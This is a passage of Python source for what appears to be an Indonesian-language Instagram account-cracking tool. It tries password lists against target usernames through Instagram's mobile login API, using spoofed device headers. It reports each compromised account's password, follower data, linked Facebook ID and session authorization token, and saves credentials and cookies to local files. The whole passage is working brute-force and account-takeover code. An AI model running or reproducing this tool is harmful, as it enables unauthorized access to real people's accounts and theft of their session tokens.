				print(f"{biru}|─{b}➤{puti} USERNAME {b}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {b}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {b}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {b}{meng}")
				print(f"{biru}|─{b}➤{puti} POSTINGAN {b}{post}")
				print(f"{biru}|─{b}➤{puti} FACEBOOK {b}{fbid}")
				print(f"{biru}|─{b}➤{puti} KUKI {b}{ig_set_authorization}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('buatpush.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {biru}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {biru}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {biru}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {biru}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {biru}{meng}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_N(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	sys.stdout.write(f"\r{biru}|─{b}➤ {puti}CRACK V4 {b}{Loop}{P} : {H}{str(len(Uuid))}{P}{P}/Ok:-{H}{Ok}{P}/Cp:-{biru}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {b}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {b}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {b}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {b}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {b}{meng}")
				print(f"{biru}|─{b}➤{puti} POSTINGAN {b}{post}")
				print(f"{biru}|─{b}➤{puti} FACEBOOK {b}{fbid}")
				print(f"{biru}|─{b}➤{puti} KUKI {b}{ig_set_authorization}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('buatpush.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {biru}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {biru}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {biru}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {biru}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {biru}{meng}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

Crack_N

if __name__ == '__main__':
	try:os.mkdir('/sdcard/Ress')
	except:pass
	try:os.mkdir('Data')
	except:pass
	try:
		Menu()#security() 
	except requests.exceptions.ConnectionError:
		print('Connection Close')
